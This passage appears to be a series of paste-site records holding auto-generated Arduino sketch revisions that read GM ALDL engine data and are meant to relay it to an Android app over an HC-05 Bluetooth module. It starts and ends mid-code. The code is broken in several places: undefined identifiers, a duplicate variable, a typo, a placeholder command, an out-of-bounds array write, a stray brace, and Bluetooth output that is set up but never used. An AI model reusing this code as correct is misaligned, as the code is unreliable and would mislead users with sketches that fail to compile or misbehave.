    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
cF0D33aV,Vehicle Data rev_17,pleasedontcode,Arduino,Friday 11th of July 2025 05:17:42 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 22:16:56

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for temperature interpolation function

/***** DEFINITION OF Software Serial *****/
// Bluetooth module HC05 connected to pins A0 (TX) and A1 (RX)
const uint8_t HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial HC05_Bluetooth_Module_HC05_mySerial(HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_RX_A1, HC05_Bluetooth_Module_HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_TX_A0);

void setup(void)
{
  // Initialize Bluetooth serial communication at 9600 baud
  HC05_Bluetooth_Module_HC05_mySerial.begin(9600);
}

void loop(void)
{
  // Variable declarations for data handling
  const byte ALDLTestPin = 4; // Input pin for ALDL activity detection
  const byte DecodeDataOutputPin = 5; // Pin to output decoded data
  const byte HexDataOutputPin = 6; // Pin to output hex data
  int ALDLbyte = 0; // Byte of ALDL data
  int bytecounter = 0; // Byte counter for formatting output
  const int linecount = 64; // Bytes per line for hex output
  byte M1Cmd[4] = {0x80, 0x56, 0x01, 0x29}; // Mode 1 command
  byte Preamble[3] = {0x80, 0x95, 0x01}; // Preamble indicating start of data stream
  bool PreambleFound = false;
  bool SilenceFound = false;
  bool CommInit8192 = false;
  const double SilenceWait = 15000; // Silence wait in microseconds
  unsigned long PreambleTimer;
  const int ByteCount = 64; // Total bytes in data packet including checksum
  byte DataBytes[ByteCount + 1]; // Data buffer (indexing from 1 for convenience)
  int DataStreamIndex = 1;
  int i = 0;
  unsigned long StartTime;
  unsigned int CheckTotal;
  byte CheckSum;

  // Variables for decoded data
  float RPM, TPS, MAF, InjPW, O2mv, MAT;
  int BLCELL, BLM, INTEGRATOR;
  unsigned int Runtime;

  // Wait for silence on ALDL line
  Serial.print(""wait for silence "");
  SilenceFound = false;
  StartTime = micros();
  while ((micros() - StartTime) < 15000)
  {
    if (digitalRead(ALDLTestPin) == 0)
    {
      StartTime = micros();
    }
  }
  SilenceFound = true;

  // Main loop: continuously request and process data
  while (SilenceFound)
  {
    PreambleFound = false;

    // Send Mode 1 command and look for preamble
    while (!PreambleFound)
    {
      Serial.print("" M1 cmd "");
      for (i = 0; i < 4; i++)
      {
        Serial1.write(M1Cmd[i]);
      }
      Serial.println("" Finding Preamble  "");
      i = 0;
      PreambleTimer = millis();
      while ((millis() - PreambleTimer) < 100 && !PreambleFound)
      {
        if (Serial1.available() > 0)
        {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i])
          {
            i++;
            if (i > 2)
              PreambleFound = true;
          }
          else
          {
            PreambleFound = false;
            i = 0;
          }
        }
      }
    }

    // Read complete data packet
    DataStreamIndex = 1;
    while (DataStreamIndex <= ByteCount)
    {
      if (Serial1.available() > 0)
      {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Calculate checksum
    i = 1;
    CheckTotal = 0x80 + 0x95 + 0x01;
    while (i < ByteCount)
    {
      CheckTotal += DataBytes[i];
      i++;
    }
    CheckSum = 0x200 - CheckTotal;

    // Send data to Android via Serial
    if (digitalRead(DecodeDataOutputPin) == LOW)
    {
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount])
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      else
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");

      // Parse data
      RPM = DataBytes[11] * 25;
      TPS = DataBytes[10] * 0.019608;
      MAF = ((DataBytes[36] * 256) + DataBytes[37]) * 0.003906;
      BLCELL = DataBytes[21];
      BLM = DataBytes[20];
      INTEGRATOR = DataBytes[22];
      InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259;
      O2mv = DataBytes[17] * 4.44;
      MAT = T_interpolate(DataBytes[30]);
      Runtime = (DataBytes[52] * 256 + DataBytes[53]);

      // Output parsed data
      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");

      // Delay for readability and buffer purge
      unsigned long StartTimeDelay = millis();
      while (millis() < StartTimeDelay + 3000)
      {
        if (Serial1.available() > 0)
          ALDLbyte = Serial1.read(); // Flush buffer
      }
    }
    else if (digitalRead(HexDataOutputPin) == LOW)
    {
      // Send hex data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount])
        Serial.println("" Checksum GOOD - Data as follows: "");
      else
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");

      int j = 1;
      bytecounter = 0;
      while (j <= ByteCount)
      {
        Serial.print(DataBytes[j], HEX);
        j++;
        bytecounter++;
        if (bytecounter >= linecount)
        {
          bytecounter = 0;
          Serial.println();
        }
        else
        {
          Serial.print("" "");
        }
      }
      Serial.println();
    }
    else
    {
      // Raw binary stream
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j <= ByteCount; j++)
      {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Subroutine to interpolate MAT temperature
float T_interpolate(byte DS_Temp)
{
  const float TempScale[38] = {1, 5, 6, 9, 11, 15, 19, 25, 31, 38, 47, 57, 67, 79, 91, 104, 117, 130, 142, 154, 164, 175, 184, 192, 200, 206, 212, 217, 222, 226, 230, 233, 235, 238, 240, 242, 244, 256};
  const float TempValue[38] = {-40, -30, -25, -20, -15, -10, -5, 0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95, 100, 105, 110, 115, 120, 125, 130, 135, 140, 145, 200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i = 0;
  while (i < 38)
  {
    if (TempScale[i] > DS_Temp)
      break;
    i++;
  }
  if (i > 0)
  {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  }
  else
  {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
EQamHnjP,Vehicle Diagnostics rev_16,pleasedontcode,Arduino,Friday 11th of July 2025 05:04:02 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Diagnostics
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 22:03:20

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Added prototype for T_interpolate function

/***** DEFINITION OF Software Serial *****/
const uint8_t HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial HC05_Bluetooth_Module_HC05_mySerial(HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_RX_A1, HC05_Bluetooth_Module_HC05_mySerial_PIN_SERIAL_TX_A0);

void setup(void)
{
  // Initialize Bluetooth serial communication
  HC05_Bluetooth_Module_HC05_mySerial.begin(9600);
}

void loop(void)
{
  // *** USER CODE START ***
  // Variables for user code
  const byte ALDLTestPin = 4; // Input used to listen for 160 BAUD ALDL activity before commanding 8192 BAUD
  const byte DecodeDataOutputPin = 5; // Input pin for decoded data output control
  const byte HexDataOutputPin = 6; // Input pin for hex data output control

  int ALDLbyte = 0; // One byte of ALDL data
  int bytecounter = 0; // count bytes for line spacing in output
  const int linecount = 64; // 32 bytes per line
  byte M1Cmd[4] = {0x80, 0x56, 0x01, 0x29}; // Mode 1 command to start 8192 Mode 1 DataStream (80 56 01 29 HEX)
  byte Preamble[3] = {0x80, 0x95, 0x01}; // Preamble from ECM indicates start of 8192 Mode 1 DataStream (80 95 01 HEX)
  bool PreambleFound = false; // Reset preamble found flag
  bool SilenceFound = false; // Flag to indicate ECM silence in 160 baud mode
  bool CommInit8192 = false; // Flag for 8192 baud communication
  const double SilenceWait = 15000; // Minimum silence period before transmitting Mode 1 command (ms)
  unsigned long PreambleTimer; // Timeout timer for preamble
  const int ByteCount = 64; // Number of data bytes following preamble
  byte DataBytes[ByteCount]; // Array to hold serial data stream
  int DataStreamIndex = 1; // Data stream byte index
  int i = 0; // Preamble index counter
  unsigned long StartTime; // Timer for measuring incoming data
  unsigned int CheckTotal; // Total for checksum calculation
  byte CheckSum; // Calculated checksum

  // Variables for decoded data
  float RPM = 0;
  float TPS = 0;
  float MAF = 0;
  float InjPW = 0;
  float O2mv = 0;
  int BLCELL = 0;
  int BLM = 0;
  int INTEGRATOR = 0;
  float MAT = 0;
  unsigned int Runtime = 0;

  // *** Wait for silence on ALDL line
  Serial.print(""wait for silence "");
  SilenceFound = false;
  StartTime = micros();
  while ((micros() - StartTime) < 15000) // wait 15ms for silence
  {
    if (digitalRead(ALDLTestPin) == 0)
    {
      StartTime = micros(); // reset timer if activity detected
    }
  }
  SilenceFound = true;

  while (SilenceFound)
  {
    // Send Mode 1 command over Bluetooth serial
    PreambleFound = false;
    while (!PreambleFound)
    {
      Serial.print("" M1 cmd "");
      i = 0;
      while (i < 4)
      {
        Serial1.write(M1Cmd[i]);
        i++;
      }
      Serial.println("" Finding Preamble "");
      i = 0;
      PreambleTimer = millis();
      while ((millis() - PreambleTimer) < 100 && !PreambleFound)
      {
        if (Serial1.available() > 0)
        {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i])
          {
            i++;
            if (i > 2) PreambleFound = true;
          }
          else
          {
            PreambleFound = false;
            i = 0;
          }
        }
      }
    }

    // Read data stream after preamble
    DataStreamIndex = 1;
    while (DataStreamIndex < 65)
    {
      if (Serial1.available() > 0)
      {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Calculate checksum
    i = 1;
    CheckTotal = 0x80 + 0x95 + 0x01; // sum preamble bytes
    while (i < ByteCount)
    {
      CheckTotal += DataBytes[i];
      i++;
    }
    CheckSum = 0x200 - CheckTotal; // two's complement

    // Send data to serial port based on control pins
    if (digitalRead(DecodeDataOutputPin) == LOW)
    {
      // Output decoded data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[63], HEX); // last byte
      if (CheckSum == DataBytes[63])
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      else
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");

      // Parse data bytes
      RPM = DataBytes[11] * 25; // RPM
      TPS = DataBytes[10] * 0.019608; // TPS volts
      MAF = ((DataBytes[36] * 256) + DataBytes[37]) * 0.003906; // MAF gm/sec
      BLCELL = DataBytes[21];
      BLM = DataBytes[20];
      INTEGRATOR = DataBytes[22];
      InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259; // ms
      O2mv = DataBytes[17] * 4.44; // mV
      MAT = T_interpolate(DataBytes[30]);
      Runtime = (DataBytes[52] * 256) + DataBytes[53];

      // Display data
      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");

      // Delay for user reading
      unsigned long StartTimeDelay = millis();
      while (millis() < StartTimeDelay + 3000)
      {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // flush buffer
      }
    }
    else if (digitalRead(HexDataOutputPin) == LOW)
    {
      // Output hex data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[63], HEX);
      if (CheckSum == DataBytes[63])
        Serial.println("" Checksum GOOD - Data as follows: "");
      else
        Serial.println("" Checksum *** ERROR *** -  Data as follows: "");

      int j = 1;
      bytecounter = 0;
      while (j < ByteCount + 1)
      {
        Serial.print(DataBytes[j], HEX);
        j++;
        bytecounter++;
        if (bytecounter >= linecount)
        {
          bytecounter = 0;
          Serial.println();
        }
        else
        {
          Serial.print("" "");
        }
      }
      Serial.println();
    }
    else
    {
      // Send raw data stream over Bluetooth serial
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j < ByteCount + 1; j++)
      {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Implementation of T_interpolate function
float T_interpolate(byte DS_Temp)
{
  const float TempScale[38] = {1, 5, 6, 9, 11, 15, 19, 25, 31, 38, 47, 57, 67, 79, 91, 104, 117, 130, 142, 154, 164, 175, 184, 192, 200, 206, 212, 217, 222, 226, 230, 233, 235, 238, 240, 242, 244, 256};
  const float TempValue[38] = {-40, -30, -25, -20, -15, -10, -5, 0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95, 100, 105, 110, 115, 120, 125, 130, 135, 140, 145, 200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i = 0;
  while (i < 38)
  {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0)
  {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  }
  else
  {
    Temperature = TempValue[0];
  }
  return Temperature;
}
// *** USER CODE END ***

}
"
jiSPM0Wx,Vehicle Data rev_15,pleasedontcode,Arduino,Friday 11th of July 2025 04:59:59 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:59:29

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp);
void sendDataToAndroid(float RPM, float TPS, float MAF, int BLCELL, int BLM, int INTEGRATOR, float InjPW, float O2mv, float MAT, unsigned int Runtime);

/***** DEFINITION OF Software Serial *****/
const uint8_t HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial HC05_BluetoothModule_HC05_mySerial(HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_RX_A1, HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_TX_A0);

// Define pins and variables used in the code
const int ALDLTestPin = 2; // Example pin, set accordingly
const int DecodeDataOutputPin = 3; // Example pin, set accordingly
const int HexDataOutputPin = 4; // Example pin, set accordingly
const byte M1Cmd[4] = {0x01, 0x02, 0x03, 0x04}; // Example command, set accordingly
const int ByteCount = 64; // Example byte count, set accordingly
const int linecount = 16; // Example line count for hex output
int DataBytes[65]; // Buffer for data bytes
bool SilenceFound = false;
bool PreambleFound = false;
unsigned long PreambleTimer = 0;
unsigned long PreambleTimerStart = 0;
int ALDLbyte = 0;
int bytecounter = 0;

// Placeholder variables for undefined identifiers
int linecount = 16; // For hex output line length

void setup(void)
{
  // put your setup code here, to run once:
  HC05_BluetoothModule_HC05_mySerial.begin(9600);
  Serial.begin(115200); // Initialize Serial for debugging/output
  pinMode(ALDLTestPin, INPUT); // ALDL activity listen pin
  pinMode(DecodeDataOutputPin, INPUT_PULLUP); // Decoded data output control
  pinMode(HexDataOutputPin, INPUT_PULLUP); // Hex data output control
  delay(1500);
  Serial.println(""Ready for data capture"");
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false; // Reset silence flag
  unsigned long StartTime = micros(); // Initialize timer
  while ((micros() - StartTime) < 15000) { // Wait for 15 ms silence
    if (digitalRead(ALDLTestPin) == 0) { // Any line activity resets timer
      StartTime = micros();
    }
  }
  SilenceFound = true; // Silence detected

  while (SilenceFound == true) { // While silence detected, request and process data
    PreambleFound = false; // Reset preamble flag

    // Send Mode 1 command to request data
    while (PreambleFound == false) {
      Serial.print("" M1 cmd "");
      for (int i = 0; i < 4; i++) {
        Serial1.write(M1Cmd[i]);
      }
      Serial.println("" Finding Preamble  "");
      int i = 0;
      PreambleTimer = millis();
      while ((millis() - PreambleTimer) < 100 && PreambleFound == false) {
        if (Serial1.available() > 0) {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i]) {
            i++;
            if (i > 2) PreambleFound = true;
          } else {
            PreambleFound = false;
            i = 0;
          }
        }
      }
    }

    // Read data stream after preamble
    int DataStreamIndex = 1;
    while (DataStreamIndex < 65) {
      if (Serial1.available() > 0) {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Calculate checksum
    int i = 1;
    unsigned long CheckTotal = 0x80 + 0x95 + 0x01; // Sum preamble bytes
    while (i < ByteCount) {
      CheckTotal += DataBytes[i];
      i++;
    }
    byte CheckSum = 0x200 - CheckTotal; // Two's complement

    // Verify checksum and output data
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }

      // Extract and convert data
      float RPM = DataBytes[11] * 25; // Engine RPM
      float TPS = DataBytes[10] * 0.019608; // Throttle position in volts
      float MAF = ((DataBytes[36] * 256) + DataBytes[37]) * 0.003906; // Mass Air Flow
      int BLCELL = DataBytes[21]; // Block learn cell
      int BLM = DataBytes[20]; // Block learn value
      int INTEGRATOR = DataBytes[22]; // Fuel trim
      float InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259; // Injector pulse width
      float O2mv = DataBytes[17] * 4.44; // O2 sensor in mV
      float MAT = T_interpolate(DataBytes[30]); // Intake temp
      unsigned int Runtime = (DataBytes[52] * 256) + DataBytes[53]; // Runtime seconds

      // Send data over Bluetooth to Android
      sendDataToAndroid(RPM, TPS, MAF, BLCELL, BLM, INTEGRATOR, InjPW, O2mv, MAT, Runtime);

      // Print data locally for debugging
      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");

      // Delay for readability
      unsigned long StartTimeDelay = millis();
      while (millis() < StartTimeDelay + 3000) {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // Flush buffer
      }
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // Output hex data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Data as follows: "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Data as follows: "");
      }

      // Print hex data
      int j = 1;
      bytebytecounter = 0;
      while (j < ByteCount + 1) {
        Serial.print(DataBytes[j], HEX);
        j++;
        bytecounter++;
        if (bytecounter >= linecount) {
          bytecounter = 0;
          Serial.println();
        } else {
          Serial.print("" "");
        }
      }
      Serial.println();
    } else {
      // Send raw data stream
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j < ByteCount + 1; j++) {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Implementation of T_interpolate function
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i = 0;
  while (i < 38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0) {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}

// Function to send data over Bluetooth to Android
void sendDataToAndroid(float RPM, float TPS, float MAF, int BLCELL, int BLM, int INTEGRATOR, float InjPW, float O2mv, float MAT, unsigned int Runtime) {
  // Format data as a comma-separated string
  String dataString = String(RPM, 0) + "","" +
                      String(TPS, 3) + "","" +
                      String(MAF, 3) + "","" +
                      String(BLCELL) + "","" +
                      String(BLM) + "","" +
                      String(INTEGRATOR) + "","" +
                      String(InjPW, 3) + "","" +
                      String(O2mv, 1) + "","" +
                      String(MAT, 1) + "","" +
                      String(Runtime);
  // Send over Bluetooth
  HC05_BluetoothModule_HC05_mySerial.println(dataString);
}
"
PY87v8bE,Vehicle Data rev_14,pleasedontcode,Arduino,Friday 11th of July 2025 04:56:56 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:55:59

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* transive data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for the interpolation function

// Declare all variables and constants used in the code
const byte ALDLTestPin = 4;                  // ALDL input pin
const byte DecodeDataOutputPin = 2;          // Output pin for decoded data
const byte HexDataOutputPin = 3;             // Output pin for hex data
const byte Preamble[3] = {0x80, 0x95, 0x01}; // Preamble sequence
const int ByteCount = 64;                    // Total bytes expected in data stream
byte DataBytes[65];                          // Array to hold data bytes
byte ALDLbyte = 0;                           // Byte read from Serial1
unsigned long PreambleTimer = 0;             // Timer for preamble timeout
unsigned long StartTime = 0;                 // Timer for silence detection
bool SilenceFound = false;                   // Silence detection flag
bool PreambleFound = false;                  // Preamble detection flag
int DataStreamIndex = 1;                     // Data stream index
float CheckTotal = 0;                        // Checksum total
byte CheckSum = 0;                           // Calculated checksum
int i = 0;                                 // Loop variable
int linecount = 32;                        // lines per block for hex printing

// Variables related to data processing
unsigned int RPM;
float TPS;
float MAF;
byte BLCELL;
byte BLM;
byte INTEGRATOR;
float InjPW;
float O2mv;
float MAT;
unsigned long Runtime;

// Function prototypes for optional functions if needed
float T_interpolate(byte DS_Temp);  // Already declared

void setup() {
  // Setup pins
  pinMode(ALDLTestPin, INPUT);                          // define D4 as an input pin
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);           // decoded data output pin
  pinMode(HexDataOutputPin, INPUT_PULLUP);              // hex data output pin

  // Initialize serial communications
  Serial.begin(115200);                                // Serial monitor
  Serial1.begin(8192);                                 // Serial port for ALDL data
  delay(1500);
  Serial.println(""Ready for data capture"");

  // Initialize variables
  i = 0;
}

void loop() {
  // Wait for silence on the ALDL line
  Serial.print(""wait for silence "");
  SilenceFound = false;
  StartTime = micros();

  while ((micros() - StartTime) < 15000) {  // wait for 15 ms silence
    if (digitalRead(ALDLTestPin) == 0) {   // line activity resets timeout
      StartTime = micros();
    }
  }
  SilenceFound = true;

  while (SilenceFound == true) {
    // Send Mode 1 command
    bool PreambleDetected = false;
    while (!PreambleDetected) {
      Serial.print("" M1 cmd "");
      i = 0;
      byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command - adjust as needed
      for (i = 0; i < 4; i++) {
        Serial1.write(M1Cmd[i]);
      }

      Serial.println("" Finding Preamble "");
      i = 0;
      PreambleTimer = millis();

      // Search for preamble
      while ((millis() - PreambleTimer) < 100 && !PreambleDetected) {
        if (Serial1.available() > 0) {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i]) {
            i++;
            if (i > 2) PreambleDetected = true; // found preamble
          } else {
            PreambleDetected = false;
            i = 0;
          }
        }
      }
    }

    // Read full data packet
    DataStreamIndex = 1;
    while (DataStreamIndex < ByteCount + 1) {
      if (Serial1.available() > 0) {
